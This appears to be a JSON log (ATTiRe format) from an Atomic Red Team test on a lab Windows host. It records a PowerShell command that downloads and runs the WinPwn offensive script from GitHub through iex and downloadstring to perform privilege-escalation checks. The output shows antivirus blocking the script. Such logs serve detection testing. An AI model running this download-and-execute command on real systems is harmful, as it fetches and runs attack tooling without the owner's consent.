@@ -1,0 +1,48 @@
+{
+    "attire-version":  "1.1",
+    "execution-data":  {
+                           "execution-source":  "Invoke-Atomicredteam",
+                           "execution-id":  "ODBiZWM4OTYtOTEzOC00Yjg4LWIwMjItZmVhY2E5MDYwMDI0",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "ART"
+                                                  },
+                           "execution-command":  "Invoke-AtomicTest T1082 -TestGuids 345cb8e4-d2de-4011-a580-619cf5a9e2d7 -PathToAtomicsFolder C:\\AtomicRedTeam\\atomics -ExecutionLogPath C:\\AtomicRedTeam\\invoke-atomicredteam\\Logs\\T1082-345cb8e4-d2de-4011-a580-619cf5a9e2d7.json -TimeoutSeconds 120 -LoggingModule Attire-ExecutionLogger",
+                           "target":  {
+                                          "user":  "redshirt\\edrba",
+                                          "host":  "RedShirt",
+                                          "ip":  "192.168.56.1",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps"
+                                      },
+                           "time-generated":  "2024-10-12T18:06:51.000Z"
+                       },
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - Powersploits privesc checks",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "345cb8e4-d2de-4011-a580-619cf5a9e2d7"
+                                            },
+                           "procedure-description":  "Powersploits privesc checks using oldchecks function of WinPwn",
+                           "order":  16,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:47.000Z",
+                                             "time-stop":  "2024-10-12T18:06:51.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\noldchecks -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\noldchecks : The term oldchecks is not recognized as the name of a cmdlet, function, script file, or operable \r\nAt line:3 char:1\r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\n+ oldchecks -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (oldchecks:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ]
+}
+
